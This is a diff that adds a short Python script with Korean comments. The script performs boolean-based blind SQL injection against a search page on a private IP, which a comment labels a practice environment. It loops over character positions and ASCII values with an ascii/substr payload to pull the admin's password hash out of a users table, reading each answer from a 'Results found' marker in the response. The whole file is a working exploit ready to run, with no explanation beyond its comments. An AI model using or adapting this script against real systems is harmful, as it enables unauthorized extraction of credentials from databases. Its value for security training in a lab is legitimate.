@@ -1,0 +1,31 @@
+import requests
+
+# 1. 환경 설정
+target_url = "http://172.16.20.107/search.php" # 실습 환경의 취약한 URL
+true_response = "Results found"               # 쿼리가 '참'일 때 화면에 나타나는 문구
+extracted_data = ""
+
+print("[+] 데이터 추출을 시작합니다...")
+
+# 2. 루프 시작 (글자 위치 1번부터 32번까지 - MD5 해시 기준)
+for i in range(1, 33):
+    # 아스키 코드 범위 (32번 스페이스부터 126번 '~'까지)
+    for j in range(32, 127):
+        # 핵심 페이로드: admin의 패스워드 i번째 글자의 아스키 값이 j인지 확인
+        payload = f"admin' AND (ascii(substr((SELECT pw FROM users WHERE id='admin'),{i},1))) = {j} --"
+        
+        # 서버에 요청 보낼 파라미터 (GET 방식 예시)
+        params = {'search': payload}
+        
+        try:
+            response = requests.get(target_url, params=params)
+            
+            # 응답에 '성공 문구'가 들어있다면 (참이라면)
+            if true_response in response.text:
+                extracted_data += chr(j)
+                print(f"[!] {i}번째 글자 발견: {chr(j)} (현재까지 추출: {extracted_data})")
+                break
+        except Exception as e:
+            print(f"[-] 에러 발생: {e}")
+
+print(f"\n[★] 최종 추출 데이터: {extracted_data}")
